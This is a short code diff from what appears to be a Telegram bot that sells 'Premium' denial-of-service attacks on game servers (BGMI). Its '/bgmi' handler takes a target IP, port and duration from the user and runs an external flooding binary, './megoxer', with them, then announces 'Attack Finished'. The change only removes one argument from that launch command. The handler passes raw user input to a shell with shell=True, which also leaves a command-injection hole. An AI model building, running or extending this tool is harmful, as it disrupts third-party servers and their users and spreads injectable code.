@@ -245,7 +245,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./megoxer {target} {port} {time} 600 MEG"
+                full_command = f"./megoxer {target} {port} {time} 600"
                 subprocess.run(full_command, shell=True)
                 response = f"✨✨Premium \nAttack Finished In This Proxy. \n📡 Target: {target} \n🔌 Port: {port} \n⏱️ Time: {time} \n NiTZEX @SAYYED_Z"
         else:
